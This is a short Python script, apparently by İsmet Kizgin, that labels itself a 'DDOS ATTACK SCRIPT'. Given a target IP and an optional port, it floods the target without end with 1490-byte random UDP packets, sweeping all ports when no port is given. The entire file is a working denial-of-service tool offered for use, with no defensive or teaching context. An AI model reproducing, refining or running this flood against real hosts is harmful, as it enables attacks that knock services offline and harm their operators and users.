import sys
import os
import time
import socket
import random
from argparse import ArgumentParser


def NewUsage(name=None):
    return """mentorddos.py [-h]
        [--ip [*IP adresi] ]
        [--port [Port numarası] ]

*Author: İsmet Kizgin
    """


def ParseArgs():
    parser = ArgumentParser(description="DDOS ATTACK SCRIPT", usage=NewUsage())
    parser._optionals.title = 'Available Arguments'
    parser.add_argument("--ip", help="Determines the ip address to attack.", type=str)
    parser.add_argument("--port", help="Specifies the port number to use, but if not entered, all ports are attacked.", type=int)
    parser.set_defaults(port=0)
    args = parser.parse_args()
    if (args.ip == None):
        print(parser.print_help())
        exit(0)
    return args


def main():
    args = ParseArgs()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    ip = args.ip
    port = args.port
    allPortState = False
    if not (port):
        port = 1
        allPortState = True

    os.system("clear")
    print(port, ip)

    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        if(allPortState):
            port = port + 1
        print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1


if __name__ == "__main__":
    main()
